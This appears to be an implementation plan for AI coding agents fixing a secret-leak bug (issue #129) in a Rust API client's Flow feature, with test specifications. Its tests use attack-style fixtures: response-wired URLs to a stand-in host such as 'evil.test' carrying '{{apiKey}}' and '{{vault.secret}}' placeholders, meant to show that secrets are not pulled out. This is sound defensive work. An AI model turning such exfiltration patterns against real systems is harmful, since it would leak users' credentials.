# Flow Wired Values Sent Literally Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A Flow request field filled by a wire or by a fetched Auth-node token is sent exactly as written, so a response can no longer pull an environment, collection or RocketVault value into the next request (issue #129).

**Architecture:** Every wire replaces a whole field (`url`, `body`, `headers[..].value`, the auth). So `resolve_request_parts` does not need to splice wired values into a saved template: it records each wired field as a *literal* `FieldTemplate` (no placeholders, output = text). A literal template also renders unchanged in the runtime pass after the pre-request scripts and adds no names to `unresolved`, so a script cannot fill them either. The #112 flag `host_env_free` ("skip only `process.env`") becomes `literal` ("skip every scope"), which is a superset.

**Tech Stack:** Rust (`rocket-app`), `tokio` tests, existing test doubles in `execution_service.rs` and `flow_execution_service.rs`.

**Spec:** GitHub issue #129 (`gh issue view 129 --repo Snehal1112/rocket`). Background: `docs/features/collection-trust.md` (the #112 host environment rule and the #130 wired-origin rule).

## Global Constraints

- Acceptance 1: a Flow whose wired `url`, header or body value contains `{{secretVar}}` or `{{alias.secret}}` sends it literally.
- Acceptance 2: placeholders in the saved request text still resolve as today.
- Fetched or supplied OAuth2 Auth-node tokens (`credentials.is_fetched_token`) are sent literally. A static Auth node's text (`Bearer {{token}}`) still resolves, whether applied by inherit or by an auth wire.
- `ExecuteRequestInput.literal` stays `#[serde(skip)]`: it is never read from or written to IPC.
- No panicking unwraps in production paths. Cargo commands take `-j4`; never `cargo test --workspace`.
- Commits: conventional format, made through the `dev-workflow-skills:1-git-commit` skill, staging explicit paths only (no `git add -A` / `.`).

## Review Focus

1. A pre-request script sets a runtime variable whose name matches a placeholder in a wired value (`rok.setVar("apiKey", ...)`): the wired text must still go out literally. Pinned in Task 1 (`literal_template_renders_its_text_unchanged`) and Task 2 (`a_script_variable_never_fills_a_wired_value`).
2. A wired body landing in a GraphQL-mode body: sent literally, mode still becomes JSON. Pinned in Task 1 (`literal_graphql_body_is_sent_as_written`).
3. The same send mixes wired and saved text naming the same variable: saved text resolves, wired text does not. Pinned in Task 1 (`literal_fields_are_sent_as_written`, header `X-Saved`) and Task 2.
4. A fetched token that holds `{{...}}`: sent literally, and the send-time mask no longer resolves it against vault scopes. Pinned in Task 2 (`a_fetched_token_is_sent_without_resolving_any_scope`, `send_time_credential_value_is_none_for_a_literal_auth`).
5. `{{$guid}}` and other dynamic names inside a wired value: sent literally, not generated. Pinned in Task 1 (`literal_template_renders_its_text_unchanged`).

Interaction with #130 (`3635e077`): `check_wired_origin` already refuses a wired URL that holds `{{` or changes the saved origin, unless the Request node has `allow_wired_host` on. So the URL half of this fix matters only on nodes that opted in; wired headers, bodies and fetched tokens are exposed on every node. Do not change `check_wired_origin`. Every Flow test below that wires a `{{...}}` URL wraps node `b` in the existing `allow_wired_host(..)` test helper, or the run fails at the origin check before anything is sent.

---

### Task 1: Literal templates for wired fields

> 📖 Before starting, read `docs/superpowers/specs/opencollection-spec-reference.md`.

**Files:**
- Modify: `crates/rocket-app/src/execution_service/runtime_fill.rs` (add `FieldTemplate::literal`, test)
- Modify: `crates/rocket-app/src/execution_service.rs:146-163` (rename field and struct), `:1401-1560` (`resolve_request_parts`), tests module near `resolve_request_resolves_placeholders_in_query_params` (~line 5067)
- Modify (rename only, `host_env_free: Default::default()` → `literal: Default::default()`): `runner_sequence.rs:221`, `graphql_request.rs:334`, `load_test_service.rs:259,378`, `execution_service/folder_var_script_tests.rs:85`, `vault_certificates.rs:745`, `execution_service.rs:4000`, `execution_service/script_chain.rs:612`
- Modify (rename only): `crates/rocket-app/src/flow_execution_service.rs` — every `host_env_free` in `apply_wired_overrides`, `apply_header_override`, the Request arm (~1716-1830) and `send_time_credential_value` (~2030). Update the doc comment of `apply_wired_overrides` ("so it never resolves `{{process.env.NAME}}`" → "so it is sent as written and never resolves any variable").

**Interfaces:**
- Produces: `pub struct LiteralFields { pub url: bool, pub body: bool, pub auth: bool, pub headers: HashSet<String> }` (header keys lower case), `#[derive(Debug, Clone, Default)]`, replacing `HostEnvFreeFields`.
- Produces: `ExecuteRequestInput::literal: LiteralFields`, `#[serde(skip)]`, replacing `host_env_free`. Doc: "The fields a Flow wire or a fetched Auth-node token filled in. Their text did not come from the saved request, so it is sent as written: no variable of any scope, `process.env` included, is put into it."
- Produces: `pub(crate) fn FieldTemplate::literal(text: &str) -> FieldTemplate` — `json: false`, empty `names`/`values`, `output == text`.

- [ ] **Step 1: Write the failing unit test in `runtime_fill.rs`**

```rust
#[test]
fn literal_template_renders_its_text_unchanged() {
    let text = "https://e.test/{{apiKey}}?v={{vault.secret}}&id={{$guid}}";
    let t = FieldTemplate::literal(text);
    assert_eq!(t.output, text);
    assert_eq!(t.render(&vars(&[("apiKey", "x"), ("vault.secret", "s")])), text);
    assert_eq!(t.process_env_names().count(), 0);
}
```

- [ ] **Step 2: Write the failing resolve tests in `execution_service.rs`**

Both build the service like `resolve_request_resolves_placeholders_in_query_params` (env `dev` with `apiKey = "k-123"`) and pass `external_secrets = {"vault.secret": "s3cr3t"}`.

`literal_fields_are_sent_as_written`: input URL `https://evil.test/c?k={{apiKey}}&v={{vault.secret}}`; headers `X-Wired: {{apiKey}}` and `X-Saved: {{apiKey}}`; body `Json` content `{"v":"{{vault.secret}}"}`; auth `Bearer { token: "{{apiKey}}" }`; `input.literal = LiteralFields { url: true, body: true, auth: true, headers: {"x-wired"} }`. Assert after `resolve_request`:
```rust
assert_eq!(resolved.url, "https://evil.test/c?k={{apiKey}}&v={{vault.secret}}");
assert_eq!(header(&resolved, "X-Wired"), "{{apiKey}}");
assert_eq!(header(&resolved, "X-Saved"), "k-123");
assert_eq!(resolved.body.and_then(|b| b.content).as_deref(), Some(r#"{"v":"{{vault.secret}}"}"#));
assert_eq!(resolved.auth, Auth::Bearer { token: "{{apiKey}}".into() });
```
(`header` is a local closure finding the value by key.)

`literal_graphql_body_is_sent_as_written`: body mode `GraphQl`, content `{"query":"{{apiKey}}"}`, `literal.body = true`. Assert content unchanged and `mode == BodyMode::Json`.

- [ ] **Step 3: Run to verify they fail**

Run: `cargo test -j4 -p rocket-app literal_`
Expected: compile errors (`FieldTemplate::literal`, `LiteralFields`, `literal` field not found).

- [ ] **Step 4: Implement**

1. Add `FieldTemplate::literal` in `runtime_fill.rs`, doc: "A field sent as written. It has no placeholders, so neither pass puts a value into it." Add one sentence to the module doc saying a field a Flow wire filled is recorded this way.
2. Rename `HostEnvFreeFields` → `LiteralFields` and `host_env_free` → `literal` everywhere listed in **Files**.
3. In `resolve_request_parts`: drop `rec_with` and its `host_env` parameter; `rec(text, json)` always records with `vars`. Add `let field = |text: &str, json: bool, literal: bool| if literal { FieldTemplate::literal(text) } else { rec(text, json) };` and use it for auth fields (`free.auth`), the URL (`free.url`), the body content (`free.body`) and header *values* (`free.headers.contains(&h.key.to_ascii_lowercase())`). Header keys, path params, query and form values use `rec` as before. `plain_vars` stays only for client certificates; update the comment above it accordingly ("Client certificates use the map without the host environment.").

- [ ] **Step 5: Run the new and the #112 tests**

Run: `cargo test -j4 -p rocket-app literal_`, then `cargo test -j4 -p rocket-app process_env`, then `cargo test -j4 -p rocket-app runtime_fill`
Expected: all PASS (the #112 flow tests already expect literal sends, so they stay green).

- [ ] **Step 6: Check and commit**

Run: `cargo check -j4 -p rocket-app --tests` and `cargo clippy -j4 -p rocket-app --tests -- -D warnings`. Expected: no errors or warnings.
Stage the modified files by path, then commit through `dev-workflow-skills:1-git-commit` (suggested subject: `fix(app): send wired flow fields as written`).

---

### Task 2: Flow end-to-end proof, credential mask and docs

> 📖 Before starting, read `docs/superpowers/specs/opencollection-spec-reference.md`.

**Files:**
- Modify: `crates/rocket-app/src/flow_execution_service.rs` (`send_time_credential_value` ~line 2030; tests next to `wired_values_never_resolve_process_env` ~line 10326)
- Modify: `docs/features/collection-trust.md:28`

**Interfaces:**
- Consumes: `ExecuteRequestInput::literal: LiteralFields` and its `auth` flag from Task 1.
- Test helpers already in the tests module: `host_env_exec`, `RecordingExecutor` (`set_body`, `sent_urls`, `sent_headers`, `sent_auths`), `request_flow_node`, `saved_flow_node`, `wire`, `auth_wire`, `run_input`, `allow_wired_host` (sets the #130 opt-in), `fetched_token_service`, `FakeCollectionRepo::with_request`.

- [ ] **Step 1: Write the tests**

Add a helper `secret_var_exec(executor) -> RequestExecutionService`: like `host_env_exec`, but the `InMemoryCollectionRepo`'s `Collection::new("my-api")` gets `settings.variables` holding `apiKey = "k-123"` (`CollectionVariable`).

`wired_values_never_resolve_collection_variables`: flow `a → b` with a `url` wire and a `headers[X-Wired].value` wire (as in `wired_values_never_resolve_process_env`, node `b` wrapped in `allow_wired_host(..)`), plus node `c` with URL `https://api.example.com/c?k={{apiKey}}`. `a`'s response body is `https://evil.test/c?k={{apiKey}}`. Assert the sent URLs contain the attack text unchanged and `https://api.example.com/c?k=k-123`, and `b`'s `X-Wired` header equals the attack text.

`a_script_variable_never_fills_a_wired_value`: saved request `req.yml` (URL `https://api.example.com/b`, `pre_request_script: Some("rok.setVar('apiKey', 'from-script');".into())`) as node `b` (`allow_wired_host(saved_flow_node("b", "req.yml"))`), wired by `url` from `a` whose body is `https://evil.test/{{apiKey}}`. Assert the sent URL for `b` is `https://evil.test/{{apiKey}}`.

`a_fetched_token_is_sent_without_resolving_any_scope`: like `a_fetched_auth_node_token_never_resolves_process_env`, but the fake fetcher returns `{{apiKey}}` and the exec is `secret_var_exec`. Add a `token: &str` parameter to `fetched_token_service` rather than copying it. Assert `sent_auths() == [Bearer { token: "{{apiKey}}" }]`.

`send_time_credential_value_is_none_for_a_literal_auth`: an input with `collection = Some("my-api")`, `auth = Bearer { token: "{{apiKey}}" }` and `literal.auth = true`, called with `secret_var_exec`. Assert `None`. With `literal.auth = false`, assert `Some("k-123")`.

- [ ] **Step 2: Run them**

Run each name separately (`cargo test` takes one filter): `cargo test -j4 -p rocket-app <name>`.
Expected: the three flow tests PASS already (Task 1 did the fix; they are the acceptance proof). `send_time_credential_value_is_none_for_a_literal_auth` FAILS on its first assertion.

- [ ] **Step 3: Implement the mask fix**

In `send_time_credential_value`, return `None` first when `request_input.literal.auth`: the send no longer resolves that credential, and a fetched token is already one of the run's secrets (`FlowCredentials::secrets`). Then `host_env` is just `request_input.backend_process_env`. Update the doc comment to list the literal (fetched token) case among the `None` cases.

- [ ] **Step 4: Run the tests**

Run: `cargo test -j4 -p rocket-app send_time_credential_value`, then `cargo test -j4 -p rocket-app flow_execution_service`
Expected: all PASS.

- [ ] **Step 5: Update the docs**

Replace `docs/features/collection-trust.md:28` with: "On backend sends, values wired from an earlier response and fetched or supplied Auth-node tokens (`ExecuteRequestInput.literal`) are sent as written: no scope resolves in them, `process.env`, environment, collection and RocketVault included (#129). Client certificate fields never resolve `process.env.*`. Text from the saved request, its folder and collection settings, and a static Auth node (`Bearer {{process.env.TOKEN}}`) still resolves."

- [ ] **Step 6: Check and commit**

Run: `cargo check -j4 -p rocket-app --tests` and `cargo clippy -j4 -p rocket-app --tests -- -D warnings`. Expected: clean.
Stage the two files by path, commit through `dev-workflow-skills:1-git-commit` (suggested subject: `fix(flow): skip the send-time mask for a literal credential`). Close issue #129 with a comment naming both commits only after the user agrees.
